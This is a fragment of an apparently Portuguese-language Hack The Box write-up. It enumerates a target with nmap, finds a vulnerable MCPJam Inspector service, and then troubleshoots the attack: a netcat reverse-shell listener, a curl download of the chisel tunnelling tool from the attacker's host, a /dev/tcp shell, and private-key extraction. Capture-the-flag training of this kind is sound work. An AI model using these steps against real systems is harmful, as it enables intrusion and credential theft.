🔍 2. Enumeração com Nmap

2.1 Varredura rápida

Por que: Descobrir portas abertas.

└─$ nmap -p- -T4 --min-rate 1000 --open [HTB_IP] 22/tcp open ssh 80/tcp open http 6274/tcp open unknown

2.2 Varredura detalhada

└─$ nmap -sC -sV -p 22,80,6274 [HTB_IP] 6274/tcp open http MCPJam Inspector v1.4.2
🔍 Descoberta: O serviço na porta 6274 é o MCPJam Inspector v1.4.2 – vulnerável!

❓ 7. Solução de Erros Comuns

Clique nas seções abaixo para ver o erro e como corrigi-lo.

Causa:

Netcat não está ouvindo, ou IP/porta incorretos.

✅ Solução:
1. Certifique-se de que nc -lvnp 4444 está rodando antes do curl.
2. Verifique se o IP no comando curl é o seu IP (ex: [YOUR_IP]).
3. Tente outra porta: nc -lvnp 9001.
Causa:

Pasta sem permissão de escrita.

✅ Solução:
Vá para /tmp: cd /tmp && curl http://[YOUR_IP]:8000/chisel -o chisel
Causa:

IP errado no curl (usou IP da máquina alvo em vez do seu).

✅ Solução:
Use seu IP ([YOUR_IP]) no /dev/tcp/.
Causa:

Chave mal formatada (com \n).

✅ Solução:
Extraia a chave com confirm: true e cole apenas o bloco -----BEGIN ... -----END.
